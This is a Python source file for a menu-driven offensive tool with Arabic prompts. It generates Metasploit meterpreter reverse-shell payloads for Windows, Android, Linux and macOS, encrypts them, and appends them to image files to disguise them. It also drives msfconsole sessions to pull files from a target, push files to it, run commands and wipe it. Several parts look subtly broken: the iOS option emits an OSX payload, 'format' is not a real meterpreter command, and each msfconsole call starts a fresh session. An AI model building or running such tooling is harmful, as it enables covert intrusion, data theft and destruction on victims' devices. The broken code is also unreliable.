import os
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from colorama import Fore, Style, init

# Initialize colorama
init()

def banner():
    print(Fore.CYAN + """
    ========================================================
                          HAMZA TOOL
    ========================================================
    """ + Style.RESET_ALL)

def save_to_desktop(filename, content):
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    path = os.path.join(desktop, filename)
    with open(path, "wb") as f:
        f.write(content)
    print(Fore.GREEN + f"تم حفظ الملف على سطح المكتب: {path}" + Style.RESET_ALL)

def create_payload(os_type):
    print(Fore.CYAN + f"جاري إنشاء بايلود لنظام {os_type}..." + Style.RESET_ALL)
    payload_name = input(Fore.YELLOW + "أدخل اسم البايلود: " + Style.RESET_ALL)
    payload_path = os.path.join(os.path.expanduser("~"), "Desktop", payload_name)

    if os_type == "windows":
        payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -o {payload_path}"
    elif os_type == "android":
        payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o {payload_path}"
    elif os_type == "linux":
        payload_command = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o {payload_path}"
    elif os_type == "ios":
        payload_command = f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f macho -o {payload_path}"
    else:
        print(Fore.RED + "نظام غير مدعوم!" + Style.RESET_ALL)
        return

    subprocess.run(payload_command, shell=True)
    print(Fore.GREEN + f"تم إنشاء البايلود: {payload_path}" + Style.RESET_ALL)

def encrypt_payload():
    payload_name = input(Fore.YELLOW + "أدخل اسم ملف البايلود لتشفيره: " + Style.RESET_ALL)
    payload_path = os.path.join(os.path.expanduser("~"), "Desktop", payload_name)

    if not os.path.exists(payload_path):
        print(Fore.RED + "ملف البايلود غير موجود على سطح المكتب." + Style.RESET_ALL)
        return

    with open(payload_path, "rb") as f:
        data = f.read()

    key = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    encrypted_name = payload_name + ".enc"
    encrypted_path = os.path.join(os.path.expanduser("~"), "Desktop", encrypted_name)

    with open(encrypted_path, "wb") as f:
        for x in (cipher.nonce, tag, ciphertext):
            f.write(x)

    print(Fore.GREEN + f"تم تشفير البايلود: {encrypted_path}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"احتفظ بمفتاح التشفير: {key.hex()}" + Style.RESET_ALL)

def merge_payload_with_image():
    payload_name = input(Fore.YELLOW + "أدخل اسم ملف البايلود: " + Style.RESET_ALL)
    image_name = input(Fore.YELLOW + "أدخل اسم ملف الصورة: " + Style.RESET_ALL)

    payload_path = os.path.join(os.path.expanduser("~"), "Desktop", payload_name)
    image_path = os.path.join(os.path.expanduser("~"), "Desktop", image_name)

    if not os.path.exists(payload_path) or not os.path.exists(image_path):
        print(Fore.RED + "ملف البايلود أو الصورة غير موجود على سطح المكتب." + Style.RESET_ALL)
        return

    output_name = input(Fore.YELLOW + "أدخل اسم الملف الناتج: " + Style.RESET_ALL)
    output_path = os.path.join(os.path.expanduser("~"), "Desktop", output_name)

    with open(image_path, "rb") as img, open(payload_path, "rb") as payload, open(output_path, "wb") as output:
        output.write(img.read())
        output.write(payload.read())

    print(Fore.GREEN + f"تم دمج البايلود مع الصورة: {output_path}" + Style.RESET_ALL)

def control_target():
    while True:
        print(Fore.CYAN + "\nخيارات التحكم:")
        print("1. عرض الملفات على الجهاز")
        print("2. تحميل ملف من الجهاز")
        print("3. رفع ملف إلى الجهاز")
        print("4. تنفيذ أمر")
        print("5. فرمتة الجهاز")
        print("6. العودة إلى القائمة الرئيسية" + Style.RESET_ALL)

        choice = input(Fore.YELLOW + "أدخل خيارك: " + Style.RESET_ALL)

        if choice == "1":
            print(Fore.CYAN + "جاري عرض الملفات..." + Style.RESET_ALL)
            subprocess.run(["msfconsole", "-x", "sessions -i 1; ls"])
        elif choice == "2":
            file_path = input(Fore.YELLOW + "أدخل مسار الملف لتحميله: " + Style.RESET_ALL)
            subprocess.run(["msfconsole", "-x", f"sessions -i 1; download {file_path}"])
        elif choice == "3":
            local_file = input(Fore.YELLOW + "أدخل مسار الملف لرفعه: " + Style.RESET_ALL)
            target_path = input(Fore.YELLOW + "أدخل المسار الهدف: " + Style.RESET_ALL)
            subprocess.run(["msfconsole", "-x", f"sessions -i 1; upload {local_file} {target_path}"])
        elif choice == "4":
            command = input(Fore.YELLOW + "أدخل الأمر للتنفيذ: " + Style.RESET_ALL)
            subprocess.run(["msfconsole", "-x", f"sessions -i 1; execute -f {command}"])
        elif choice == "5":
            print(Fore.RED + "تحذير: فرمتة الجهاز ستؤدي إلى فقدان البيانات!" + Style.RESET_ALL)
            subprocess.run(["msfconsole", "-x", "sessions -i 1; format"])
        elif choice == "6":
            break
        else:
            print(Fore.RED + "خيار غير صحيح. حاول مرة أخرى." + Style.RESET_ALL)

def main():
    while True:
        banner()
        print(Fore.YELLOW + """
        1. إنشاء بايلود ويندوز
        2. إنشاء بايلود أندرويد
        3. إنشاء بايلود لينكس
        4. إنشاء بايلود iOS
        5. تشفير بايلود
        6. دمج بايلود مع صورة
        7. التحكم في الجهاز الهدف
        8. الخروج
        """ + Style.RESET_ALL)

        choice = input(Fore.CYAN + "أدخل خيارك: " + Style.RESET_ALL)

        if choice == "1":
            create_payload("windows")
        elif choice == "2":
            create_payload("android")
        elif choice == "3":
            create_payload("linux")
        elif choice == "4":
            create_payload("ios")
        elif choice == "5":
            encrypt_payload()
        elif choice == "6":
            merge_payload_with_image()
        elif choice == "7":
            control_target()
        elif choice == "8":
            print(Fore.GREEN + "وداعًا!" + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "خيار غير صحيح. حاول مرة أخرى." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
